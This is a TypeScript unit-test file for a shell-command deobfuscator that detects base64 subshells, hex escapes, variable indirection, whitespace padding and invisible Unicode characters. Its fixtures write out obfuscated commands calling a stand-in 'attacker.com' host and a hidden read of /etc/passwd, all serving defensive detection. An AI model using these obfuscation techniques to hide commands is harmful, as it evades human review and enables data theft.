/**
 * @license
 * Copyright 2026 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  deobfuscateCommand,
  hasDenyFinding,
  hasAnyFinding,
} from './shell-deobfuscator.js';

describe('deobfuscateCommand', () => {
  describe('clean commands', () => {
    it('passes through a clean command with no findings', () => {
      const result = deobfuscateCommand('npm test');
      expect(result.findings).toHaveLength(0);
      expect(result.decoded).toBe('npm test');
    });

    it('passes through a command with benign base64 content in arguments (not a subshell)', () => {
      const result = deobfuscateCommand('echo "some text with == padding"');
      expect(hasDenyFinding(result)).toBe(false);
    });
  });

  describe('base64 subshell detection', () => {
    it('decodes a base64-encoded subshell', () => {
      // Y3VybCBhdHRhY2tlci5jb20= = "curl attacker.com"
      const result = deobfuscateCommand(
        'make clean && $(echo Y3VybCBhdHRhY2tlci5jb20= | base64 -d)',
      );
      expect(hasAnyFinding(result)).toBe(true);
      const b64Finding = result.findings.find(
        (f) => f.type === 'base64_subshell',
      );
      expect(b64Finding).toBeDefined();
      expect(b64Finding?.severity).toBe('warn');
      expect(result.decoded).toContain('curl attacker.com');
    });

    it('detects herestring base64 variant', () => {
      const result = deobfuscateCommand(
        '$(base64 -d <<< Y3VybCBhdHRhY2tlci5jb20=)',
      );
      const b64Finding = result.findings.find(
        (f) => f.type === 'base64_subshell',
      );
      expect(b64Finding).toBeDefined();
      expect(result.decoded).toContain('curl attacker.com');
    });

    it('does not decode non-base64 strings', () => {
      const result = deobfuscateCommand('$(echo "!not base64$$" | base64 -d)');
      const b64Finding = result.findings.find(
        (f) => f.type === 'base64_subshell',
      );
      expect(b64Finding).toBeUndefined();
    });
  });

  describe('hex escape detection', () => {
    it('decodes hex escape sequences', () => {
      // $'\x63\x75\x72\x6c' = "curl"
      const result = deobfuscateCommand("$'\\x63\\x75\\x72\\x6c' attacker.com");
      const hexFinding = result.findings.find((f) => f.type === 'hex_escape');
      expect(hexFinding).toBeDefined();
      expect(hexFinding?.severity).toBe('warn');
      expect(result.decoded).toContain('curl');
    });
  });

  describe('variable indirection detection', () => {
    it('substitutes simple variable assignments', () => {
      const result = deobfuscateCommand('C=curl; H=attacker.com; $C $H');
      const varFinding = result.findings.find(
        (f) => f.type === 'variable_indirection',
      );
      expect(varFinding).toBeDefined();
      expect(varFinding?.severity).toBe('warn');
      expect(result.decoded).toContain('curl');
      expect(result.decoded).toContain('attacker.com');
    });
  });

  describe('whitespace padding detection', () => {
    it('detects whitespace padding before a separator and marks as deny', () => {
      const padded = 'npm test' + ' '.repeat(50) + '; curl attacker.com';
      const result = deobfuscateCommand(padded);
      const paddingFinding = result.findings.find(
        (f) => f.type === 'whitespace_padding',
      );
      expect(paddingFinding).toBeDefined();
      expect(paddingFinding?.severity).toBe('deny');
      expect(hasDenyFinding(result)).toBe(true);
    });

    it('does not flag normal spaces within a command', () => {
      const result = deobfuscateCommand('git commit -m "fix bug"');
      const paddingFinding = result.findings.find(
        (f) => f.type === 'whitespace_padding',
      );
      expect(paddingFinding).toBeUndefined();
    });
  });

  describe('unicode invisible character detection', () => {
    it('detects zero-width space and marks as deny', () => {
      const withZWS = 'curl​ attacker.com';
      const result = deobfuscateCommand(withZWS);
      const unicodeFinding = result.findings.find(
        (f) => f.type === 'unicode_invisible',
      );
      expect(unicodeFinding).toBeDefined();
      expect(unicodeFinding?.severity).toBe('deny');
      expect(hasDenyFinding(result)).toBe(true);
    });

    it('detects RTL override character', () => {
      const withRTL = 'ls ‮/etc/passwd';
      const result = deobfuscateCommand(withRTL);
      expect(hasDenyFinding(result)).toBe(true);
    });

    it('strips invisible characters from decoded output', () => {
      const withZWS = 'curl​ attacker.com';
      const result = deobfuscateCommand(withZWS);
      expect(result.decoded).not.toContain('​');
    });
  });
});
